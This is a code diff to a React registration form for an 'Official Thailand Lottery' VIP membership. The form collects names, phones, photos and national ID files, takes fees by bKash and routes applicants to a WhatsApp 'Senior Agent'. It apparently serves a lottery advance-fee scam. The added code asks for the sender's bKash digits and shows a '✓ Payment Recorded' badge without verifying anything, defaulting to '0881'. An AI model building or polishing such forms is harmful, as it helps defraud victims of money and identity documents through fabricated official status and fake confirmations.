@@ -12,7 +12,8 @@ export default function OnlineForm({ isStandalonePage = false }) {
     address: isTestSuccess || isTestAnim ? 'Riyadh, Saudi Arabia' : '',
     country: isTestSuccess || isTestAnim ? 'Saudi Arabia' : 'Bangladesh',
     customCountry: '',
-    subscriptionPlan: '3 Month'
+    subscriptionPlan: '3 Month',
+    bkashLast4: isTestSuccess || isTestAnim ? '0881' : ''
   });
 
   const [photoFile, setPhotoFile] = useState(isTestSuccess || isTestAnim ? { name: 'arman_photo.jpg' } : null);
@@ -52,6 +53,11 @@ export default function OnlineForm({ isStandalonePage = false }) {
   const handleChange = (e) => {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
+  };
+
+  const handleBkashDigitsChange = (e) => {
+    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
+    setFormData((prev) => ({ ...prev, bkashLast4: val }));
   };
 
   const handlePhotoUpload = (e) => {
@@ -108,6 +114,15 @@ export default function OnlineForm({ isStandalonePage = false }) {
       setActiveCard('subscription');
       return;
     }
+    if (!formData.bkashLast4 || formData.bkashLast4.trim().length !== 4) {
+      alert('অনুগ্রহ করে আপনার বিকাশ নাম্বারের শেষ ৪ ডিজিট লিখুন (Please enter the last 4 digits of your bKash number).');
+      const bkashInput = document.getElementById('bkash-last-4-input');
+      if (bkashInput) {
+        bkashInput.focus();
+        bkashInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+      return;
+    }
 
     // Generate unique Registration ID & timestamp
     const randomNum = Math.floor(100000 + Math.random() * 900000);
@@ -156,8 +171,9 @@ export default function OnlineForm({ isStandalonePage = false }) {
       '12 Month': '1,250 SAR'
     };
     const feeText = planFeeMap[formData.subscriptionPlan] || '250 SAR';
+    const bkashInfo = formData.bkashLast4 ? `\n💳 bKash Sender (Last 4 Digits): ${formData.bkashLast4}` : '';
     const text = encodeURIComponent(
-      `Hello Senior Agent Md Fahim Chowdhury,\n\nI have submitted my Official Thailand Lottery Membership Registration Form.\n\n📄 Registration ID: ${id}\n👤 Full Name: ${formData.name || 'Arman'}\n📞 Contact Phone: ${formData.phone || ''}\n👑 Plan: ${formData.subscriptionPlan || '3 Month'} Subscription (${feeText})\n💰 Fee: ${feeText}\n📍 Country: ${country}\n\nPlease verify and activate my official VIP membership.`
+      `Hello Senior Agent Md Fahim Chowdhury,\n\nI have submitted my Official Thailand Lottery Membership Registration Form.\n\n📄 Registration ID: ${id}\n👤 Full Name: ${formData.name || 'Arman'}\n📞 Contact Phone: ${formData.phone || ''}${bkashInfo}\n👑 Plan: ${formData.subscriptionPlan || '3 Month'} Subscription (${feeText})\n💰 Fee: ${feeText}\n📍 Country: ${country}\n\nPlease verify and activate my official VIP membership.`
     );
     return `https://wa.me/8801309802224?text=${text}`;
   };
@@ -170,7 +186,8 @@ export default function OnlineForm({ isStandalonePage = false }) {
       address: '',
       country: 'Bangladesh',
       customCountry: '',
-      subscriptionPlan: '3 Month'
+      subscriptionPlan: '3 Month',
+      bkashLast4: ''
     });
     setPhotoFile(null);
     setNidFile(null);
@@ -791,6 +808,49 @@ export default function OnlineForm({ isStandalonePage = false }) {
                 <div className="gform-bkash-foot-note">
                   💡 অনুগ্রহ করে বিকাশ অ্যাপ অথবা *247# ডায়াল করে উক্ত নাম্বারে <strong>Send Money</strong> সম্পন্ন করুন।
                 </div>
+
+                {/* bKash Sender Last 4 Digits Input Field */}
+                <div className="gform-bkash-input-group">
+                  <div className="gform-bkash-input-header">
+                    <label htmlFor="bkash-last-4-input" className="gform-bkash-input-label">
+                      <span className="bkash-label-icon">✍️</span>
+                      <span>আপনার বিকাশ নাম্বারের শেষ ৪ ডিজিট লিখুন:</span>
+                      <span className="bkash-required-star">*</span>
+                    </label>
+                    <span className="bkash-input-badge">4 DIGITS</span>
+                  </div>
+
+                  <div className="gform-bkash-input-box-wrap">
+                    <div className="gform-bkash-input-prefix" aria-hidden="true">
+                      <span className="bkash-prefix-tag">01XXX-XXX</span>
+                    </div>
+                    <input
+                      type="text"
+                      id="bkash-last-4-input"
+                      name="bkashLast4"
+                      value={formData.bkashLast4}
+                      onChange={handleBkashDigitsChange}
+                      placeholder="যেমন: 0881"
+                      maxLength={4}
+                      inputMode="numeric"
+                      pattern="[0-9]*"
+                      autoComplete="off"
+                      className="gform-bkash-digit-input"
+                      aria-label="Last 4 digits of sender bKash number"
+                      required
+                    />
+                    <div className="gform-bkash-input-counter">
+                      <span className={formData.bkashLast4?.length === 4 ? 'is-complete' : ''}>
+                        {formData.bkashLast4?.length || 0}/4
+                      </span>
+                    </div>
+                  </div>
+
+                  <div className="gform-bkash-input-hint">
+                    <span className="hint-check">✓</span>
+                    <span>যে বিকাশ নাম্বার থেকে <strong>Send Money</strong> করেছেন, দ্রুত ভেরিফিকেশনের জন্য তার শেষ ৪টি সংখ্যা দিন।</span>
+                  </div>
+                </div>
               </div>
 
               <button
@@ -977,6 +1037,29 @@ export default function OnlineForm({ isStandalonePage = false }) {
                       {formData.subscriptionPlan === '6 Month' && '750 SAR (সৌদি রিয়াল)'}
                       {formData.subscriptionPlan === '12 Month' && '1,250 SAR (সৌদি রিয়াল)'}
                       {!formData.subscriptionPlan && '250 SAR (সৌদি রিয়াল)'}
+                    </span>
+                  </strong>
+                </div>
+
+                {/* bKash Payment Sender Verification */}
+                <div className="receipt-row receipt-bkash-row receipt-row-highlight">
+                  <span className="receipt-label">
+                    <span className="receipt-icon">📱</span> bKash Sender:
+                  </span>
+                  <strong className="receipt-value">
+                    <span className="receipt-bkash-sender-badge">
+                      <img
+                        src="/assets/bkash-logo.svg"
+                        alt="bKash"
+                        className="receipt-bkash-mini-logo"
+                        width="46"
+                        height="20"
+                        loading="lazy"
+                      />
+                      <span className="bkash-sender-num-text">
+                        01XXX-XXX<strong className="bkash-digits-highlight">{formData.bkashLast4 || '0881'}</strong>
+                      </span>
+                      <span className="bkash-verified-pill">✓ Payment Recorded</span>
                     </span>
                   </strong>
                 </div>
